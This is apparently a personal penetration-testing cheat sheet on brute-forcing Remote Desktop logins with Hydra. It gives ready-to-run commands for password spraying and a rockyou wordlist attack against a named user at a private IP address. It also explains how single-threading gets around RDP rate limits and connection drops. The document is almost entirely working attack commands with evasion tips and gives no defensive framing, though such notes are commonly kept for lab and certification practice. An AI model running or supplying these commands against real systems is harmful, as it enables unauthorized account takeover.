# RDP

### Hydra

```
hydra -L user.txt -p "Password1" rdp://<ip>
```

This works better:

```
hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.103.227 -T1 -I
```

```-T1``` Forces hydra to use 1 thread only which is more suitable when attacking rdp
as rdp server has rate-limits, drop connections and sometimes block attempts.
This makes sure that requests per password are processed properly.

```-I``` ignores previous session so that Hydra doesn't skip attempted passwords.